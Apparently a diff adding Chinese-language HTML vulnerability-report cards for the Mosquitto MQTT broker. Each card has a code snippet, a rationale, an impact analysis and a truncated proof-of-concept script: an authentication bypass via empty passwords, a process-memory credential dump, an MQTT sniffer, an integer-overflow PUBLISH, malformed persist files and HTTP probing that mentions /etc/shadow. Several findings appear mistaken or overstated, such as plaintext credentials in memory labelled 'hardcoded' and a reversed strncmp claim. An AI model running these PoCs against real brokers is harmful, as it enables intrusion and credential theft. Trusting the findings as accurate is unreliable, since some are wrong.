+                <p><strong>数据流:</strong> 用户控制的MQTT主题通过ed-&gt;topic传入，代码直接修改该字符串。攻击者可以发送一个主题长度小于7字节（/uplink长度）的消息，导致strlen(ed-&gt;topic) - strlen(&quot;/uplink&quot;)为负数，从而在数组边界之前写入空字节。</p>
+                <p><strong>判断理由:</strong> 代码没有检查ed-&gt;topic的长度是否大于等于7（/uplink的长度）。如果主题长度小于7，strlen(ed-&gt;topic) - strlen(&quot;/uplink&quot;)将产生一个负值，用作数组索引会导致在堆栈或堆内存的边界之前写入空字节，造成缓冲区下溢。这可能导致内存损坏、程序崩溃，甚至被利用执行任意代码。</p>
+                <p><strong>影响分析:</strong> 该漏洞是缓冲区下溢（buffer underflow）问题。当ed-&gt;topic长度小于7字节时，strlen(ed-&gt;topic) - strlen(&#x27;/uplink&#x27;)产生负值，用作数组索引会导致在堆栈或堆内存边界之前写入空字节。这可能导致：1) 内存损坏，破坏其他数据结构；2) 程序崩溃（DoS）；3) 在特定条件下可能被利用执行任意代码。虽然当前模式匹配限制了可触发漏洞的主题长度，但代码缺乏显式长度检查，存在潜在安全风险。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-5126587F - Mosquitto Topic Modification Plugin Buffer Underflow
+仅供研究使用 (For Research Purposes Only)
+&quot;&quot;&quot;
+
+import paho.mqtt.client as mqtt
+import time
+
+# MQTT Broker配置
+BROKER_HOST = &quot;localhost&quot;
+BROKER_PORT = 1883
+TOPIC_PREFIX = &quot;device/&quot;
+
+# 测试用例：构造各种可能触发漏洞的主题
+# 注意：由于mosquitto_topic_matches_sub的匹配逻辑，实际触发需要满足模式匹配
+# 这里展示的是概念验证，展示不同长度主题的行为
+
+test_topics = [
+    # 正常情况（长度 &gt;= 19）
+    &quot;device/1/data/uplink&qu</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-74414EF7 - 字符串截断逻辑缺陷</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> plugins\examples\topic-modification\mosquitto_topic_modification.c:60</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>mosquitto_topic_matches_sub(&quot;device/+/data/uplink&quot;, ed-&gt;topic, &amp;result);
+if(result){
+    ed-&gt;topic[strlen(ed-&gt;topic) - strlen(&quot;/uplink&quot;)] = &#x27;\0&#x27;;
+}</code></pre>
+                <p><strong>数据流:</strong> 用户控制的MQTT主题通过ed-&gt;topic传入。mosquitto_topic_matches_sub函数使用通配符匹配，但后续的字符串操作没有验证主题是否确实以&quot;/uplink&quot;结尾。</p>
+                <p><strong>判断理由:</strong> mosquitto_topic_matches_sub使用通配符&#x27;+&#x27;匹配，这意味着主题&quot;device/任意内容/data/uplink&quot;都会匹配成功。但后续代码假设匹配的主题一定以&quot;/uplink&quot;结尾，实际上通配符匹配的主题可能包含其他内容。例如主题&quot;device/extra/data/uplink_extra&quot;也会匹配，但截断操作会错误地移除字符串中间的部分，导致主题被破坏。虽然这不会直接导致内存安全漏洞，但会造成逻辑错误，可能被用于绕过主题过滤或导致消息路由异常。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过发布精心构造的MQTT主题来触发字符串截断逻辑错误。虽然不会直接导致内存安全漏洞，但会造成以下影响：1) 主题被错误截断，导致消息路由到错误的主题；2) 可能绕过基于主题的访问控制；3) 可能导致消息丢失或重复；4) 在更复杂的场景中，可能被用于信息泄露或权限提升。严重程度为中等，因为需要特定的插件配置且不直接导致代码执行。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - Mosquitto主题截断逻辑缺陷PoC
+# 该PoC演示如何利用通配符匹配+字符串截断逻辑缺陷
+
+# 前置条件：Mosquitto broker加载了存在漏洞的topic-modification插件
+# 测试环境：Mosquitto 2.0+ with topic-modification.so
+
+BROKER=&quot;localhost&quot;
+PORT=1883
+
+# 正常主题 - 应该被正确处理
+# 主题: device/sensor1/data/uplink
+# 预期行为: 截断为 device/sensor1/data
+
+echo &quot;=== 测试1: 正常主题（预期行为）===&quot;
+mosquitto_pub -h $BROKER -p $PORT -t &quot;device/sensor1/data/uplink&quot; -m &quot;normal&quot; -d
+
+echo &quot;&quot;
+echo &quot;=== 测试2: 利用漏洞 - 主题包含额外后缀 ===&qu</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-7319E9A2 - 潜在的认证绕过 - 空密码处理</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> plugins\password-file\password_check.c:44</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(u-&gt;pw){
+    if(ed-&gt;password){
+        return mosquitto_pw_verify(u-&gt;pw, ed-&gt;password);
+    }else{
+        return MOSQ_ERR_AUTH;
+    }
+}else{
+    return MOSQ_ERR_SUCCESS;
+}</code></pre>
+                <p><strong>数据流:</strong> 用户输入ed-&gt;username -&gt; HASH_FIND查找用户 -&gt; 如果用户存在但u-&gt;pw为空(密码字段为空)，直接返回MOSQ_ERR_SUCCESS(认证成功)</p>
+                <p><strong>判断理由:</strong> 当用户存在于密码文件中但密码字段为空时，代码直接返回认证成功。这意味着任何知道用户名的人都可以在不需要密码的情况下登录，如果密码文件中有用户记录但密码字段为空，将导致认证绕过。</p>
+                <p><strong>影响分析:</strong> 攻击者可以绕过密码认证，以密码文件中密码字段为空的用户身份登录Mosquitto服务器。如果存在高权限用户（如admin）且密码字段为空，攻击者可以获得完全控制权。这可能导致：1) 未经授权发布或订阅MQTT主题；2) 访问敏感数据；3) 向设备发送恶意控制指令；4) 在IoT场景中可能导致物理设备被未授权控制。漏洞的根本原因是代码在用户存在但密码哈希字段为NULL时直接返回认证成功，完全跳过了密码验证逻辑。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - Mosquitto密码文件空密码认证绕过PoC
+# 漏洞: VULN-7319E9A2
+
+# 前置条件: 目标Mosquitto服务器使用password-file插件，且密码文件中存在密码字段为空的用户
+
+TARGET_HOST=&quot;localhost&quot;
+TARGET_PORT=1883
+VULNERABLE_USER=&quot;testuser&quot;  # 密码文件中密码字段为空的用户名
+
+# 使用mosquitto_pub测试认证绕过
+# 注意: 不提供密码参数，利用空密码认证绕过漏洞
+mosquitto_pub -h $TARGET_HOST -p $TARGET_PORT \
+    -u &quot;$VULNERABLE_USER&quot; \
+    -t &quot;test/topic&quot; \
+    -m &quot;认证绕过测试消息&quot; \
+    -d  # -d 开启调试输出以显示认证过程
+
+# 如果连接成功，说明认证绕过漏洞存在
+# 预期输出应包含: &quot;Se</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-2A8D8FCE - 缓冲区溢出 - 就地解码十六进制字符串</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> plugins/persist-sqlite/restore.c:131</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>for(size_t i=0; i&lt;slen; i+=2){
+    ((uint8_t *)j_value-&gt;valuestring)[i/2] = (uint8_t)(hex2nibble(j_value-&gt;valuestring[i])&lt;&lt;4) + hex2nibble(j_value-&gt;valuestring[i+1]);
+}</code></pre>
+                <p><strong>数据流:</strong> 用户提供的JSON数据 -&gt; cJSON_Parse() -&gt; j_value-&gt;valuestring -&gt; 就地解码覆盖原始字符串</p>
+                <p><strong>判断理由:</strong> 代码将十六进制字符串就地解码为二进制数据，覆盖了原始的valuestring缓冲区。当十六进制字符串长度为奇数时，循环会读取越界（访问valuestring[i+1]），导致缓冲区过读。同时，解码后的二进制数据可能包含空字节，导致后续使用该字符串的函数（如mosquitto_property_add_binary）行为异常。此外，解码后的数据长度是原始字符串的一半，但代码没有考虑这种情况下的内存安全问题。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过控制持久化数据触发缓冲区过读。主要影响包括：1) 信息泄露：越界读取可能泄露相邻内存中的敏感数据；2) 拒绝服务：异常数据可能导致程序崩溃或行为异常；3) 数据损坏：解码后的空字节可能导致后续数据处理错误。虽然攻击面相对有限（需要数据库写入权限），但一旦触发，可能导致严重的安全问题。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-2A8D8FCE - 缓冲区溢出漏洞（就地解码十六进制字符串）
+仅供安全研究使用，请勿用于非法用途。
+&quot;&quot;&quot;
+
+import sqlite3
+import json
+import os
+import sys
+
+# 漏洞利用说明：
+# 该漏洞存在于 Mosquitto MQTT Broker 的持久化插件中。
+# 攻击者通过控制 SQLite 数据库中的持久化数据，
+# 构造一个包含奇数长度十六进制字符串的 JSON 属性，
+# 触发缓冲区过读漏洞。
+
+def create_malicious_db(db_path):
+    &quot;&quot;&quot;
+    创建一个包含恶意数据的 SQLite 数据库文件。
+    该数据库模拟 Mosquitto 持久化存储的格式。
+    &quot;&quot;&quot;
+    conn = sqlite3.connect(db_path)
+    cursor = conn.cursor(</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-7466AA8C - 硬编码凭证</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src/bridge.c:72</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>new_context-&gt;username = bridge-&gt;remote_username;
+new_context-&gt;password = bridge-&gt;remote_password;</code></pre>
+                <p><strong>数据流:</strong> bridge-&gt;remote_username 和 bridge-&gt;remote_password 从配置中读取，直接赋值给上下文对象</p>
+                <p><strong>判断理由:</strong> 远程桥接的凭据（用户名和密码）以明文形式存储在内存中，没有进行加密或安全存储。如果攻击者能够访问进程内存，可以提取这些凭据。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致远程MQTT桥接凭据泄露。攻击者可利用提取的凭据：1) 连接到远程MQTT Broker，订阅/发布消息；2) 横向移动到其他系统；3) 获取敏感数据流。虽然需要较高的本地访问权限，但在容器环境、共享主机或云环境中风险显著增加。凭据以明文形式存在于进程内存中，即使配置文件已加密，运行时仍可被提取。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC: 从Mosquitto Broker进程内存中提取明文桥接凭据
+仅供安全研究使用 - VULN-7466AA8C
+&quot;&quot;&quot;
+
+import os
+import sys
+import struct
+import ctypes
+
+# 目标进程名称
+PROCESS_NAME = &quot;mosquitto&quot;
+
+def find_pid(process_name):
+    &quot;&quot;&quot;查找目标进程的PID&quot;&quot;&quot;
+    try:
+        import psutil
+        for proc in psutil.process_iter([&#x27;pid&#x27;, &#x27;name&#x27;]):
+            if proc.info[&#x27;name&#x27;] == process_name:
+                return proc.info</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-1099CEDB - 不安全的加密</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src/bridge.c:72</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>new_context-&gt;username = bridge-&gt;remote_username;
+new_context-&gt;password = bridge-&gt;remote_password;</code></pre>
+                <p><strong>数据流:</strong> 密码以明文形式存储和传输</p>
+                <p><strong>判断理由:</strong> 桥接密码以明文形式存储在内存中，并且可能以明文形式通过网络传输（如果未启用TLS）。这违反了密码安全存储的最佳实践。</p>
+                <p><strong>影响分析:</strong> 该漏洞允许网络中的攻击者通过嗅探MQTT桥接连接流量，直接获取明文形式的用户名和密码凭据。一旦获取这些凭据，攻击者可以：1) 使用相同的凭据连接到MQTT代理，订阅和发布消息；2) 获取对MQTT消息流的完全访问权限；3) 可能利用这些凭据访问其他使用相同密码的系统。由于密码以明文形式存储和传输，即使攻击者无法实时嗅探，也可以通过内存转储或日志文件获取密码。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC: Mosquitto Bridge 密码明文泄露漏洞利用
+漏洞ID: VULN-1099CEDB
+仅供研究使用 - 请勿用于非法用途
+&quot;&quot;&quot;
+
+import socket
+import struct
+import sys
+import argparse
+
+# MQTT协议常量
+CONNECT = 0x10
+CONNACK = 0x20
+PUBLISH = 0x30
+SUBSCRIBE = 0x82
+
+class MQTTSniffer:
+    &quot;&quot;&quot;MQTT桥接密码嗅探器&quot;&quot;&quot;
+    
+    def __init__(self, interface=&#x27;eth0&#x27;, port=1883):
+        self.interface = interface
+        self.port = port
+        self.sock = None
+        
+    </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-2E1DC157 - 字符串比较逻辑缺陷</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src/bridge_topic.c:120</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(cur_topic-&gt;topic != NULL &amp;&amp; topic != NULL){
+    if(strcmp(cur_topic-&gt;topic, topic)){
+        continue;
+    }
+}
+if(cur_topic-&gt;local_prefix != NULL &amp;&amp; local_prefix != NULL){
+    if(strcmp(cur_topic-&gt;local_prefix, local_prefix)){
+        continue;
+    }
+}
+if(cur_topic-&gt;remote_prefix != NULL &amp;&amp; remote_prefix != NULL){
+    if(strcmp(cur_topic-&gt;remote_prefix, remote_prefix)){
+        continue;
+    }
+}</code></pre>
+                <p><strong>数据流:</strong> 在bridge__find_topic函数中，当两个指针都为NULL时，比较会跳过，可能导致误判为匹配</p>
+                <p><strong>判断理由:</strong> 当cur_topic-&gt;topic为NULL且topic也为NULL时，比较被跳过，但此时应该视为匹配。然而如果cur_topic-&gt;topic为NULL而topic不为NULL，或者相反，比较也被跳过，可能导致不匹配的情况被误判为匹配。这是一个逻辑缺陷，可能导致重复添加或错误匹配。</p>
+                <p><strong>影响分析:</strong> 该漏洞导致bridge__find_topic函数在查找桥接主题时产生错误匹配。具体影响包括：1) 当存储的topic为NULL而查找的topic不为NULL时，会错误地认为找到匹配，导致重复添加相同的桥接主题映射；2) 当存储的topic不为NULL而查找的topic为NULL时，同样会错误匹配；3) 可能导致桥接消息路由错误，消息被错误地转发到不匹配的主题映射；4) 在极端情况下，可能导致桥接配置混乱，影响MQTT Broker的桥接功能正确性。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: bridge__find_topic 函数中的字符串比较逻辑缺陷
+ * 影响: Mosquitto MQTT Broker 桥接主题查找逻辑错误
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+/* 模拟数据结构 */
+struct mosquitto__bridge_topic {
+    char *topic;
+    char *local_prefix;
+    char *remote_prefix;
+    int direction;
+    int qos;
+    struct mosquitto__bridge_topic *next;
+};
+
+struct mosquitto__bridge {
+    struct mosquitto__bridge_topic *topics;
+};
+
+/* 模拟链表宏 */
+#define LL_FOREACH(head, el) for(el = h</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-723840C1 - 资源泄漏 - 错误处理路径不完整</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src/bridge_topic.c:195</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>error:
+    mosquitto_FREE(cur_topic-&gt;local_prefix);
+    mosquitto_FREE(cur_topic-&gt;remote_prefix);
+    mosquitto_FREE(cur_topic-&gt;local_topic);
+    mosquitto_FREE(cur_topic-&gt;remote_topic);
+    mosquitto_FREE(cur_topic-&gt;topic);
+    mosquitto_FREE(cur_topic);
+    log__printf(NULL, MOSQ_LOG_ERR, &quot;Error: Out of memory.&quot;);
+    return MOSQ_ERR_NOMEM;</code></pre>
+                <p><strong>数据流:</strong> 在bridge__add_topic函数的错误处理标签中，释放了所有分配的内存，但bridge-&gt;topic_count已经递增</p>
+                <p><strong>判断理由:</strong> 在函数开头bridge-&gt;topic_count++已经执行，如果后续分配失败跳转到error标签，topic_count不会回滚，导致计数不准确。虽然不会造成直接的安全漏洞，但可能导致后续逻辑错误。</p>
+                <p><strong>影响分析:</strong> 该漏洞导致bridge结构体的topic_count字段与实际topic数量不一致。虽然不会直接导致内存泄漏或安全漏洞，但可能产生以下影响：1) 遍历topic列表时可能访问无效指针，导致程序崩溃；2) 依赖topic_count的统计和监控功能显示不准确数据；3) 在清理资源时可能遗漏或重复操作；4) 在极端情况下，如果topic_count被用于数组索引或内存分配计算，可能导致缓冲区溢出等更严重的安全问题。</p>
+                <details><summary>PoC代码</summary><pre><code>/*
+ * PoC代码 - 仅供研究使用
+ * 漏洞: VULN-723840C1 - bridge__add_topic函数中topic_count计数不一致
+ * 
+ * 此PoC演示了在内存分配失败时，bridge-&gt;topic_count不会回滚的问题
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+
+/* 模拟mosquitto内部结构 */
+#define MOSQ_ERR_SUCCESS 0
+#define MOSQ_ERR_NOMEM 1
+#define MOSQ_ERR_INVAL 2
+
+enum mosquitto__bridge_direction {
+    bd_out = 0,
+    bd_in = 1,
+    bd_both = 2
+};
+
+struct mosquitto__bridge_topic {
+    char *local_prefix;
+    char *remot</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-2C19EB2A - 信息泄露 - 路径遍历错误信息</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src\http_api.c:96</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(!resolved){
+		if(errno == EACCES){
+			*error_code = MHD_HTTP_FORBIDDEN;
+		}else if(errno == EINVAL || errno == EIO || errno == ELOOP){
+			*error_code = MHD_HTTP_INTERNAL_SERVER_ERROR;
+		}else if(errno == ENAMETOOLONG){
+			*error_code = MHD_HTTP_URI_TOO_LONG;
+		}else if(errno == ENOENT || errno == ENOTDIR){
+			*error_code = MHD_HTTP_NOT_FOUND;
+		}</code></pre>
+                <p><strong>数据流:</strong> realpath()失败时，根据不同的errno值返回不同的HTTP状态码。攻击者可以通过构造特定的URL路径来触发不同的错误，从而推断文件系统的状态信息</p>
+                <p><strong>判断理由:</strong> 不同的错误码泄露了不同的系统信息：EACCES表示文件存在但权限不足，ENOENT表示文件不存在，ELOOP表示存在符号链接循环等。攻击者可以利用这些不同的错误响应来探测文件系统的结构和权限配置，进行信息收集</p>
+                <p><strong>影响分析:</strong> 该漏洞允许攻击者通过分析HTTP错误码差异来探测文件系统状态。具体影响包括: 1) 识别文件系统中存在的文件(通过403 vs 404区分); 2) 发现符号链接结构(通过500错误); 3) 探测路径长度限制; 4) 收集系统配置信息用于后续攻击。虽然不能直接读取文件内容，但收集的信息可以显著提高目录遍历攻击的成功率，并帮助攻击者定位高价值目标(如密码文件、密钥文件等)。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/bin/bash
+# 仅供研究使用 - 路径遍历信息泄露漏洞PoC
+# 目标: 通过差异化HTTP错误码探测文件系统状态
+
+TARGET=&quot;http://target-server:8080&quot;
+HTTP_DIR=&quot;/var/www/mosquitto&quot;  # 假设的HTTP根目录
+
+echo &quot;[*] 开始探测文件系统信息...&quot;
+echo &quot;&quot;
+
+# 测试1: 探测不存在的文件 (预期返回404)
+echo &quot;[测试1] 访问不存在的文件:&quot;
+curl -s -o /dev/null -w &quot;HTTP状态码: %{http_code}\n&quot; &quot;$TARGET/nonexistent_file.html&quot;
+
+# 测试2: 探测存在的文件但权限不足 (预期返回403)
+echo &quot;&quot;
+echo &quot;[测试2] 访问权限受限的文件:&quot;
+# 假设/etc/shadow存在但不可读
+curl -s -o /dev</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #ffc107;">
+                <h3>VULN-F78D0AF9 - 不安全的WebSocket子协议处理 - 缺少长度验证</h3>
+                <span class="severity" style="background:#ffc107;color:white;padding:2px 8px;border-radius:3px;">MEDIUM</span>
+                <p><strong>文件:</strong> src\http_serv.c:127</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>if(!strncmp(http_headers[i].value, &quot;mqtt&quot;, http_headers[i].value_len)
+					|| !strncmp(http_headers[i].value, &quot;mqttv3.1&quot;, http_headers[i].value_len)){
+
+				subprotocol = http_headers[i].value;
+				subprotocol_len = (int)http_headers[i].value_len;
+			}</code></pre>
+                <p><strong>数据流:</strong> 用户通过Sec-WebSocket-Protocol头提供子协议值，该值直接用于后续响应构造</p>
+                <p><strong>判断理由:</strong> 子协议匹配使用strncmp但未检查value_len是否等于目标字符串长度，可能导致部分匹配。例如，value为&#x27;mqtt-extra&#x27;且value_len为10时，strncmp(http_headers[i].value, &quot;mqtt&quot;, 10)会返回0（匹配），但实际子协议不是&#x27;mqtt&#x27;。这可能导致不正确的子协议协商</p>
+                <p><strong>影响分析:</strong> 攻击者可以通过发送精心构造的Sec-WebSocket-Protocol头，使服务器错误地接受非标准子协议。这可能导致：1) 子协议协商绕过，允许客户端使用非标准协议进行通信；2) 可能触发服务器端的未定义行为或逻辑错误；3) 在某些情况下，可能导致WebSocket连接状态不一致，影响后续数据处理。虽然严重程度为中等，但在特定配置下可能被用于绕过安全控制或触发其他漏洞。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC代码 - 仅供研究使用
+漏洞: 不安全的WebSocket子协议处理 - 缺少长度验证
+&quot;&quot;&quot;
+
+import socket
+import base64
+import hashlib
+import struct
+
+def create_websocket_request(host, port, subprotocol_value):
+    &quot;&quot;&quot;
+    构造恶意的WebSocket升级请求
+    
+    利用原理:
+    代码中使用 strncmp(http_headers[i].value, &quot;mqtt&quot;, http_headers[i].value_len)
+    只检查前缀匹配，不检查长度是否相等。
+    因此发送 &quot;mqtt-extra&quot; 会匹配成功，但实际不是标准mqtt子协议。
+    &quot;&quot;&quot;
+    
+    # 生成随机的WebSocket</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-F00B844D - 缓冲区溢出/未初始化内存访问</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src\loop.c:72</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>base_msg-&gt;data.payload = mosquitto_malloc(base_msg-&gt;data.payloadlen+1);
+if(base_msg-&gt;data.payload == NULL){
+    db__msg_store_free(base_msg);
+    return MOSQ_ERR_NOMEM;
+}
+/* Ensure payload is always zero terminated, this is the reason for the extra byte above */
+((uint8_t *)base_msg-&gt;data.payload)[base_msg-&gt;data.payloadlen] = 0;
+memcpy(base_msg-&gt;data.payload, pub_msg-&gt;payload, base_msg-&gt;data.payloadlen);</code></pre>
+                <p><strong>数据流:</strong> 用户输入通过pub_msg-&gt;payloadlen和pub_msg-&gt;payload传入，在single_publish函数中分配内存并复制数据。如果payloadlen为0，则分配1字节内存，memcpy复制0字节，但零终止符写入是安全的。然而，如果payloadlen非常大（如UINT32_MAX），则payloadlen+1会溢出为0，导致malloc(0)返回小内存块，后续memcpy造成堆缓冲区溢出。</p>
+                <p><strong>判断理由:</strong> payloadlen是uint32_t类型，当payloadlen为UINT32_MAX时，payloadlen+1溢出为0，mosquitto_malloc(0)可能返回一个有效指针但内存很小，后续memcpy复制UINT32_MAX字节数据会导致严重的堆缓冲区溢出。这是一个经典的整数溢出漏洞。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致Mosquitto Broker进程崩溃（拒绝服务），或在更严重的情况下实现远程代码执行。由于漏洞是堆缓冲区溢出，攻击者可能控制溢出数据来覆盖堆上的关键数据结构，最终劫持程序控制流。考虑到Mosquitto通常以root或高权限运行，成功利用可能导致完全控制服务器。即使仅导致崩溃，也会中断所有MQTT通信，造成严重服务中断。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-F00B844D - Mosquitto Broker Integer Overflow Heap Buffer Overflow
+仅供研究使用 (For Research Purposes Only)
+&quot;&quot;&quot;
+
+import socket
+import struct
+import sys
+
+# MQTT协议常量
+CONNECT = 0x10
+CONNACK = 0x20
+PUBLISH = 0x30
+
+# 构建MQTT CONNECT报文
+def build_connect():
+    protocol_name = b&quot;MQTT&quot;
+    protocol_level = 4  # MQTT 3.1.1
+    connect_flags = 0x02  # Clean Session
+    keep_alive = 60
+    client_id = b&quot;poc_exploit&quot;
+    
+   </code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-8D169AA6 - 整数溢出</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src\loop.c:71</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>base_msg-&gt;data.payloadlen = (uint32_t)pub_msg-&gt;payloadlen;
+base_msg-&gt;data.payload = mosquitto_malloc(base_msg-&gt;data.payloadlen+1);</code></pre>
+                <p><strong>数据流:</strong> pub_msg-&gt;payloadlen来自外部输入，经过类型转换后用于内存分配计算。payloadlen+1可能发生整数溢出。</p>
+                <p><strong>判断理由:</strong> uint32_t类型的payloadlen最大值是4294967295，加1后变为0，导致分配0字节内存。后续memcpy会复制大量数据到堆内存中，造成堆溢出。</p>
+                <p><strong>影响分析:</strong> 成功利用该漏洞可导致堆缓冲区溢出，可能造成：1) Broker进程崩溃，导致拒绝服务；2) 在特定条件下可能实现远程代码执行；3) 内存数据泄露。由于漏洞位于核心消息处理路径，任何连接到Broker的客户端都可能触发该漏洞。CVSS评分预计为7.5-9.0（高危-严重）。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for Mosquitto Broker Integer Overflow Vulnerability (VULN-8D169AA6)
+仅供研究使用 - For Research Purposes Only
+
+该PoC演示了如何通过发送特制的MQTT PUBLISH消息触发整数溢出漏洞。
+当payloadlen设置为0xFFFFFFFF时，内存分配计算溢出为0，
+后续memcpy操作导致堆缓冲区溢出。
+&quot;&quot;&quot;
+
+import socket
+import struct
+import sys
+
+# MQTT协议常量
+CONNECT = 0x10
+CONNACK = 0x20
+PUBLISH = 0x30
+QOS_0 = 0x00
+
+# 目标服务器配置
+HOST = &#x27;127.0.0.1&#x27;
+PORT = 1883
+
+def create_connect_packet(client_id=&quot;poc_client&quot;):
+    &quo</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-A6DB4BE6 - 不安全的文件读取操作（缺少边界检查）</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src/persist.h:37</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>#define read_e(f, b, c) if(fread(b, 1, c, f) != c){ rc = MOSQ_ERR_UNKNOWN; goto error; }</code></pre>
+                <p><strong>数据流:</strong> 宏定义read_e直接调用fread读取数据，但未对读取的数据长度c进行任何校验。调用方可能传入未经验证的长度值，导致缓冲区溢出或读取越界。</p>
+                <p><strong>判断理由:</strong> 该宏在多个读取函数中使用，如果传入的长度c来自外部数据（如文件中的chunk长度字段），攻击者可以通过构造恶意的持久化文件，使fread读取超出目标缓冲区大小的数据，造成缓冲区溢出。虽然fread本身有长度参数，但宏没有对长度进行任何合理性检查，完全依赖调用方确保c不超过缓冲区大小。</p>
+                <p><strong>影响分析:</strong> 成功利用此漏洞可导致：1) Mosquitto broker进程崩溃，造成拒绝服务(DoS)；2) 在特定条件下可能实现远程代码执行(RCE)，因为溢出可以覆盖函数指针或返回地址；3) 持久化数据库损坏，导致消息丢失或服务不可用；4) 如果broker以root权限运行，可能导致权限提升。CVSS评分估计为7.5-9.0（高-严重），具体取决于利用复杂度。</p>
+                <details><summary>PoC代码</summary><pre><code>#!/usr/bin/env python3
+&quot;&quot;&quot;
+PoC for VULN-A6DB4BE6 - Mosquitto Broker Persist File Buffer Overflow
+仅供研究使用 (For Research Purposes Only)
+
+该PoC演示如何构造恶意持久化文件，利用read_e宏缺少边界检查的漏洞
+触发缓冲区溢出。
+&quot;&quot;&quot;
+
+import struct
+import os
+import sys
+
+# Mosquitto持久化文件魔数 (15字节)
+MAGIC = b&#x27;mosquitto_db_v6\x00&#x27;
+
+# DB块类型定义
+DB_CHUNK_CFG = 1
+DB_CHUNK_BASE_MSG = 2
+DB_CHUNK_CLIENT_MSG = 3
+DB_CHUNK_RETAIN = 4
+DB_CHUNK_SUB = 5
+DB_CHUNK_CLIENT = 6
+
+# 正常PF_header结构 (8字节)
+# uint32_t chunk (4字节)
+# uin</code></pre></details>
+            </div>
+            <div class="vuln-card" style="border-left: 4px solid #fd7e14;">
+                <h3>VULN-8852A187 - 缺少输入验证（持久化数据信任问题）</h3>
+                <span class="severity" style="background:#fd7e14;color:white;padding:2px 8px;border-radius:3px;">HIGH</span>
+                <p><strong>文件:</strong> src/persist.h:37-38</p>
+                <p><strong>代码片段:</strong></p>
+                <pre><code>#define read_e(f, b, c) if(fread(b, 1, c, f) != c){ rc = MOSQ_ERR_UNKNOWN; goto error; }
